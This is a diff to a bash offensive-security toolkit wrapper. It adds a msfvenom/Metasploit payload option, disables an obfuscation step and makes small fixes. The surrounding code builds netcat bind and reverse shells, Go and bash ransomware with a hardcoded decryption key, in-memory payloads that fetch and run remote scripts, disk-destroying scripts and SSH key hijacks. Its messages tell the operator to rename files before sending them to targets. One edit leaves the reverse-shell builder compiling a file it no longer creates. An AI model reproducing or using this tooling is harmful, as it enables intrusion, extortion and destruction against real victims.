@@ -44,6 +44,7 @@ dos_bombs_bin="$bin/unzip_bomb"
 linux_exploit_checker_bin="$bin/linux_exploit_checker"
 ssh_attack_bin="$bin/make_ssh_keys"
 lecb="$bin/lece"
+msfvenom_bin="$bin/msf_payload_creater"
 # Attempt to source the tab completion script in the bin folder
 source "$bin/tab_complete.cstk"
 # Other bin files not used by the wrapper
@@ -378,7 +379,7 @@ show_help() {
     echo -e "enum           auto-enum       auto_enum   $c  [ automated enumeration script against target website ]$b"
     echo -e "breached    	breached-email 		breached_email 	$c	[ search a domain name for breached email accounts ]$b"
 	echo -e "gd		google-dorks		google_dorks  $c  	[ get help using google dorks ]$b"
-	echo -e "email	email-search		email_search  $c	[ search hundreds of well known websites for a email account ]"
+	echo -e "email	email-search		email_search  $c	[ search hundreds of well known websites for a email account ]$x\n"
     echo -e "$c\nPayload Class:\n$b"
     echo -e "nc          	ncat 			netcat 	$c		[ create a netcat binding\treverse encrypted shell script ]$b"
     echo -e "linuxshell  	linux-shell 		linux_shell 	$c	[ create a multi reverse shell script for a linux system ]$b"
@@ -387,6 +388,7 @@ show_help() {
     echo -e "notouch     	no-touch 		no_touch 	$c	[ create a script to grab a file online and run in memory ]$b"
     echo -e "kill        	kill-computer 		kill_computer 	$c	[ create a executable script that will destroy a linux computer if ran ]$b"
     echo -e "ssh            ssh-attack          ssh_attack      $c  [ executable script to remove then add new .ssh folder/add your public key/restrict access ]$b"
+    echo -e "msf            venom               metasploit      $c  [ use msfvenom and metasploit to create a reverse or binding shell script ]$x \n"
     echo -e "$c\nPost Exploitation Class:\n$b"
     echo -e "vm          	check-vm 		check_vm 	$c	[ check if computer is running on a Virtual Machine ]$b"
     echo -e "browserthief	browser-thief 		browser_thief 	$c	[ search multiple web browser files for passwords, cookies, history much more ]$b"
@@ -396,14 +398,14 @@ show_help() {
     echo -e "onstart     	on-start 		on_start 	$c	[ embed a command that runs on startup ]$b"
     echo -e "bruteforce  	brute-force 		brute_force 	$c	[ brute force a zip or rar password protected archive ]$b"
     echo -e "foi         	files-of-interest 	files_of_interest $c	[ fast and automated interesting file search tool with ability to archive the results ]$b"
-	echo -e "drk         	deploy-rootkit 		deploy_rootkit 	$c	[ fast generation of a number of different rootkits both for userland and kernel ]$b"
+	echo -e "drk         	deploy-rootkit 		deploy_rootkit 	$c	[ fast generation of a number of different rootkits both for userland and kernel ]$x\n"
     echo -e "$c\nEtc Class:\n$b"
     echo -e "usershells  	user-shells 		user_shells 	$c	[ find all users and the default shells on a system ]$b"
     echo -e "webserver   	web-server 		web_server 	$c	[ start a webserver for easy file transfer to a remote host ]$b"
     echo -e "extract     	file-extract 		file_extract 	$c	[ extract many types of archive files ]$b"
     echo -e "openssl     	------------ 		---------- 	$c	[ openssl helper for hashing passwords, file encryption, generate keys much more ]$b"
     echo -e "secretnote  	secret-note 		secret_note $c		[ create a gpg key with a encoded secret message of your choice ]$b"
-    echo -e "binary      	binary-script 		binary_script $c		[ create a encoded - encrypted executable binary script from a bash script ]$x"
+    echo -e "binary      	binary-script 		binary_script $c		[ create a encoded - encrypted executable binary script from a bash script ]$x\n"
     echo -e "$c\nHelp Menu Options:\n "
     echo -e "$r \$0	$g		\$1 $r "
     echo -e "sudo cstk$g	-h|-H|--help 	$c				[ Show General Help Menu ]$r"
@@ -477,7 +479,9 @@ function handle_input() {
 
 		7 -$p Start a DoS Bomb$c 			(Start a zip bomb or picture bomb that will overload the memory causing computer to crash) $g
 
-		8 -$p SSH Payload script$c                  (malicious script to remove and create new .ssh directory adding your private key and restrict access to everyone) $r
+		8 -$p SSH Payload script$c                  (malicious script to remove and create new .ssh directory adding your private key and restrict access to everyone) $g
+
+		9 -$p Metasploit (msfvenom)$c               (create a shell script for remote connection using msfvenom and metasploit)$r
 
         	X - Back to main menu $x" ;;
         3) logo_postexploit ; echo -e "$g \n\n Enter Exploit Tool Number: $p
@@ -503,7 +507,7 @@ function handle_input() {
 		X - Back to main menu$x" ;;
         4) logo_etc ; echo -e "$p \n\n Enter Tool Number: $g
 
-        1 -$p Users and Shell's $b 		(find all users and there default shells local computer) $g
+        1 -$p Users and Shell's $b 		(find all users and their default shells local computer) $g
 
         2 -$p Python Web server $b 		(start a webserver for File Transfers) $g
 
@@ -545,6 +549,7 @@ function execute_tool() {
 	        6) destroy_computer ;;
 	        7) dos_bomb_attack ;;
 	        8) ssh_attack ;;
+	        9) msf_payloads ;;
             X|x) main_menu ;;
             *) class_menu ;;
         esac ;;
@@ -597,7 +602,7 @@ getip() {
         read -r -p "${g}==> ${x}" chosen_ip
 
         # Check if the user chose to enter a custom IP
-        if [[ "$chosen_ip" =~ "[Oo]ther" ]]; then
+        if [[ "$chosen_ip" =~ ^[Oo] ]]; then
             read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
         fi
 
@@ -661,7 +666,7 @@ find_that_ip() {
         lat=$(echo "$data" | jq -r '.lat')
         lon=$(echo "$data" | jq -r '.lon')
         isp=$(echo "$data" | jq -r '.isp')
-        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nProgram ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n---------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp" | tee -a "$Loot/IP-Lookup.txt"
+        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nScript Ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n---------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp" | tee -a "$Loot/IP-Lookup.txt"
 		if [[ -n $ports ]]; then
         	echo -e "Open Ports Found:\t\t  $ports" | tee -a "$Loot/IP-Lookup.txt"
         fi
@@ -671,7 +676,7 @@ find_that_ip() {
     	echo -e "$g\nInformation saved in $Loot/IP-Lookup.txt $x"
     else
         echo -e "$r Failed to retrieve information. $x"
-		echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nProgram ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
+		echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nScript Ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
     fi
 
     wait_and_return
@@ -829,7 +834,7 @@ netcat_choice() {
 	if [[ "$opt" -eq 1 ]]; then
 		netcat_shells_bind
 	elif [[ "$opt" -eq 2 ]]; then
-        	netcat_shells_reverse
+        netcat_shells_reverse
 	else
 		wait_and_return
 	fi
@@ -845,15 +850,19 @@ netcat_shells_bind() {
 	template=$(cat "$NetcatBindShell")
 	final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo "$final_script" > netcatbindshell.temp1 # create full correct script
-    bash-obfuscate -c 2 -r netcatbindshell.temp1 -o netcatbindshell.temp2 # obfuscate script does not use bin/bash when encrypting
-	echo '#!/bin/bash' > netcatbindshell.temp3 # create new file with bin bash as first line
-    cat netcatbindshell.temp2 >> netcatbindshell.temp3 # append the encrypted script to file
-    chmod 770 netcatbindshell.temp3
-    shc -r -f netcatbindshell.temp3 -o "$Malware"/NetcatBindingShellScript # compile script
+#    bash-obfuscate -c 2 -r netcatbindshell.temp1 -o netcatbindshell.temp2 # obfuscate script does not use bin/bash when encrypting
+#	echo '#!/bin/bash' > netcatbindshell.temp3 # create new file with bin bash as first line
+#    cat netcatbindshell.temp2 >> netcatbindshell.temp3 # append the encrypted script to file
+    chmod 770 netcatbindshell.temp1
+    shc -r -f netcatbindshell.temp1 -o "$Malware"/NetcatBindingShellScript # compile script
     rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
     echo -e "$c File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. $x"
-    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nProgram Used: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
-    wait_and_return
+    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nScript Ran: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: Netcat Reverse Shell - Option 1-B
@@ -866,15 +875,20 @@ netcat_shells_reverse() {
 	template=$(cat "$NetcatRevShell")
 	final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo "$final_script" > netcatreverseshell.temp1 # create full correct script
-    bash-obfuscate -c 2 -r netcatreverseshell.temp1 -o netcatreverseshell.temp2 # obfuscate script does not use bin/bash when encrypting
-    echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
-    cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
-    chmod 770 netcatreverseshell.temp3
-    shc -r -f netcatreverseshell.temp3 -o "$Malware"/NetcatReverseShellScript # compile script
+#    bash-obfuscate -c 2 -r netcatreverseshell.temp1 -o netcatreverseshell.temp2 # obfuscate script does not use bin/bash when encrypting
+#    echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
+#    cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
+    chmod 770 netcatreverseshell.temp1
+    shc -r -f netcatreverseshell.temp1 -o "$Malware"/NetcatReverseShellScript # compile script
     rm -f netcatreverseshell.* "$ncro" "$NetcatRevShell" # remove junk files
     echo -e "$c File \"NetcatReverseShellScript\" is ready and executable in the $Malware folder. \nChange the name of file before sending to target. $x"
     echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser IP used: $chosen_ip \nUser Port $chosen_port \nNetcat Reverse shell create" >> "$log/NetcatReverseShell.log"
-    wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
+
 }
 
 # Class: PAYLOADS - Tools: Linux Back door Creator - Option 2
@@ -888,11 +902,11 @@ rev_shells() {
 	final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo  "$final_script" > revshell.temp1
 	rm -f "$rvso" "$LinuxRevShell"
-	bash-obfuscate -c 2 revshell.temp1 -o revshell.temp2
-	wait
-	echo '#!/bin/bash' > revshell.temp3
-	cat revshell.temp2 >> revshell.temp3
-    chmod 770 revshell.temp3
+#	bash-obfuscate -c 2 revshell.temp1 -o revshell.temp2
+#	wait
+#	echo '#!/bin/bash' > revshell.temp3
+#	cat revshell.temp2 >> revshell.temp3
+    chmod 770 revshell.temp1
     shc -r -f revshell.temp3 -o "$Malware"/RevShell
 	wait
 	rm -f revshell.*
@@ -979,12 +993,12 @@ ransomware_in_go() {
     done
     openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwg" -out "$rwgo" -pass pass:"$pswd" &>/dev/null
     openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rdg" -out "$rdgo" -pass pass:"$pswd" &>/dev/null
-    base32hex -d "$rwgo" | base64 --wrap 16 -d | base32plain -d > "$RansomEncryptGo" 
-    base32hex -d "$rdgo" | base64 --wrap 16 -d | base32plain -d > "$RansomDecryptGo" 
-    pushd "$lib" &>/dev/null
-    env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo" 
-    env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo" 
-    rm -f "$rwgo" "$rdgo" "$RansomEncryptGo" "$RansomDecryptGo" 
+    base32hex -d "$rwgo" | base64 --wrap 16 -d | base32plain -d > "$RansomEncryptGo"
+    base32hex -d "$rdgo" | base64 --wrap 16 -d | base32plain -d > "$RansomDecryptGo"
+    pushd "$lib" &>/dev/null || return
+    env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo"
+    env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo"
+    rm -f "$rwgo" "$rdgo" "$RansomEncryptGo" "$RansomDecryptGo"
     if [[ "$system" = "windows" ]]; then
         mv "$RansomwareEGoW" "$Malware/$encfilename.exe"
         mv "$RansomwareDGoW" "$Malware/$decfilename.exe"
@@ -992,7 +1006,7 @@ ransomware_in_go() {
         mv "$RansomwareEGo" "$Malware/$encfilename"
         mv "$RansomwareDGo" "$Malware/$decfilename"
     fi
-    popd &>/dev/null
+    popd &>/dev/null || return
     echo "K5R0z4Js58vpNzSq4nixjQt2av8FcIvb" > "$Malware/$decfilename.key"
     echo -e "${g} \nThe encrypt and decrypt scripts are available in the ${r} $Malware ${g} folder if they are for a windows computer there will be a ${y} .exe extension ${x}"
     echo -e "${b} \nTo run the encryption script the target needs to run this command in there terminal: ${r} go run $encfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $encfilename.exe ${x} (Windows)"
@@ -1000,7 +1014,11 @@ ransomware_in_go() {
     echo -e "${c} \nWhen target tries to decrypt there files they will be asked for a ${r} secret key ${c} the key they need is:==>  ${r} K5R0z4Js58vpNzSq4nixjQt2av8FcIvb ${c} <== ${x}"
     echo -e "${y} \nBecause they need a secret key to decrypt there files you are fine to send both files at the same time, the key ${r} is not readable. ${x}"
     echo -e "${g} \nA copy of the key is also in the ${r} $Malware ${g} folder named ${r} $decfilename.key ${x}"
-    wait_and_return   
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
  }
 
 # Class: PAYLOADS - Tool: Ransomware encrypt/decrypt script - Option 3
@@ -1030,22 +1048,25 @@ ransomware_quick_dirty() {
 	echo "$final_script" > ransom_encrypt_remote.temp1 # create a file for ransomware and decription below
 	echo "$final_script_d" > ransom_decrypt_remote.temp1
 	rm -f "$rweo" "$RansomEncrypt" "$rwdo" "$RansomDecrypt"
-	bash-obfuscate -c 2 -r ransom_encrypt_remote.temp1 -o ransom_encrypt_remote.temp2 # encrypt the script's
-	wait
-	bash-obfuscate -c 2 -r ransom_decrypt_remote.temp1 -o ransom_decrypt_remote.temp2
-	wait
-	echo '#!/bin/bash' > ransom_encrypt_remote.temp3 # get a encrypted file ready for shc - shc needs /bin/bash as 1st line
-    echo '#!/bin/bash' > ransom_decrypt_remote.temp3
-	cat ransom_encrypt_remote.temp2 >> ransom_encrypt_remote.temp3 # add content of encrypted script and decryption script below
-	cat ransom_decrypt_remote.temp2 >> ransom_decrypt_remote.temp3
-	chmod 770 ransom_encrypt_remote.temp3 ransom_decrypt_remote.temp3
-	shc -r -f ransom_encrypt_remote.temp3 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
-	shc -r -f ransom_decrypt_remote.temp3 -o "$Malware"/ransom_nice_and_clean
+#	bash-obfuscate -c 2 -r ransom_encrypt_remote.temp1 -o ransom_encrypt_remote.temp2 # encrypt the script's
+#	wait
+#	bash-obfuscate -c 2 -r ransom_decrypt_remote.temp1 -o ransom_decrypt_remote.temp2
+#	wait
+#	echo '#!/bin/bash' > ransom_encrypt_remote.temp3 # get a encrypted file ready for shc - shc needs /bin/bash as 1st line
+#   echo '#!/bin/bash' > ransom_decrypt_remote.temp3
+#	cat ransom_encrypt_remote.temp2 >> ransom_encrypt_remote.temp3 # add content of encrypted script and decryption script below
+#	cat ransom_decrypt_remote.temp2 >> ransom_decrypt_remote.temp3
+	chmod 770 ransom_encrypt_remote.temp1 ransom_decrypt_remote.temp1
+	shc -r -f ransom_encrypt_remote.temp1 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
+	shc -r -f ransom_decrypt_remote.temp1 -o "$Malware"/ransom_nice_and_clean
 	rm -rf ransom_encrypt_remote.* ransom_decrypt_remote.*
 	echo -e "\n\n $c File ransom_quick_and_dirty and ransom_nice_and_clean are ready and executable in the $Malware folder. \nransom_quick-dirty.sh is the encrypting script. \nransomnice_clean is the decrypting script. $x"
 	echo -e "\n\nDate: $DATE \nUser: $USER \nPassword used for key encryption: $PASSWORD1 \nEmail used for victim respond back: $EMAIL" >> "$log/ransom_quick_dirty.log" "$log/ransom_nice_clean.log"
-
-	wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
 }
 
 # Class:PAYLOADS - Tool:Multi reverse shell option script - Option 4 (wrapper used)
@@ -1086,15 +1107,19 @@ no_touch_script() {
 	script=$(echo "$template" | awk -v http="$HTTP" -v host="$HOST" -v script="$SCRIPT" '{ gsub(/HTTP/, http) ; gsub(/HOST/, host) ; gsub(/SCRIPT/, script) ; print }')
 	echo "$script" > no_touch_disk.temp1
 	rm -f "$ntso" "$NoTouchScript"
-	bash-obfuscate -c 2 -r no_touch_disk.temp1 -o no_touch_disk.temp2
-	echo '#!/bin/bash' > no_touch_disk.temp3
-	cat no_touch_disk.temp2 >> no_touch_disk.temp3
-	chmod 770 no_touch_disk.temp3
-	shc -r -f no_touch_disk.temp3 -o "$Malware"/no_touch_disk_payload
+#	bash-obfuscate -c 2 -r no_touch_disk.temp1 -o no_touch_disk.temp2
+#	echo '#!/bin/bash' > no_touch_disk.temp3
+#	cat no_touch_disk.temp2 >> no_touch_disk.temp3
+	chmod 770 no_touch_disk.temp1
+	shc -r -f no_touch_disk.temp1 -o "$Malware"/no_touch_disk_payload
 	rm -rf no_touch_disk.*
 	echo -e "\n\n $p File no_touch_disk_payload is available in the $Malware folder, change name and make executable before sending to target. $x \n"
 	echo -e "\n Date: $DATE \nUser: $USER \n Program used: in memory payload \n Target script to grab and run: $HTTP://$HOST/$SCRIPT " >> "$log/no-touch-payload"
-	wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: destroy this computer - Option 6
@@ -1140,6 +1165,20 @@ ssh_attack() {
     sleep 3
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$ssh_attack_bin"
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
+}
+
+# Class: PAYLOADS - Tool: metasploit (msfvenom) shell creater - Option 9 9Wrapper used)
+msf_payloads() {
+    payloads_msf_frame
+    sleep 3
+    getip
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$msfvenom_bin"
     wait_and_return
 }
 
@@ -1777,7 +1816,8 @@ case $class in
 		    	notouch|no-touch|no_touch) no_touch_script ;;
 		    	kill|kill-computer|kill_computer) destroy_computer ;;
 		    	dos|denial_of_service|denial-of-service) dos_bomb_attack ;;
-		    	ssh|ssh_attack|ssh-attack) ssh_attack
+		    	ssh|ssh_attack|ssh-attack) ssh_attack ;;
+		    	msf|venom|metasplloit) msf_payloads ;;
         	    *) echo -e "Unknown Payload program: $2"; show_help; exit 18 ;;
         	esac
         	;;
